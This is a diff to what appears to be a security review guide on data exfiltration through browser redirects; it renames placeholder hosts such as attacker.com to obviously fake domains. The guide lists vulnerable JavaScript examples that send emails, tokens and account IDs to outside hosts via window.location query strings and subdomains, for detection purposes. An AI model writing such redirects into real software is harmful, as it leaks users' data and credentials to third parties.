@@ -21,7 +21,7 @@ Scope & Signals
   - `document.location`, `self.location`, `location` variants
 - Data egress vectors:
   - Query parameters: `?userData=${sensitiveData}`
-  - Subdomains: `${userData}.attacker.com`
+  - Subdomains: `${userData}.ATTACKER-CONTROLLED-DOMAIN.example`
   - Path segments: `/exfil/${userData}`
 
 Vulnerable Patterns
@@ -33,7 +33,7 @@ window.location = `https://external-site.com/callback?data=${userData.email}`;
 
 // VULNERABLE - Building URL with sensitive context
 const issueData = await fetchIssueDetails();
-window.location.href = `https://analytics.example.com/track?issue=${issueData.key}&user=${issueData.reporter}`;
+window.location.href = `https://ANALYTICS-CALLBACK-DOMAIN.example/track?issue=${issueData.key}&user=${issueData.reporter}`;
 
 // VULNERABLE - Redirect to undeclared domain
 window.location = 'https://not-in-manifest.com/page';
@@ -45,7 +45,7 @@ window.location.assign(`${baseUrl}?token=${token}`);
 
 // VULNERABLE - Data in subdomain
 const userId = context.accountId;
-window.location = `https://${userId}.tracking.attacker.com/`;
+window.location = `https://${userId}.TRACKING-DOMAIN.example/`;
 ```
 
 Secure Patterns
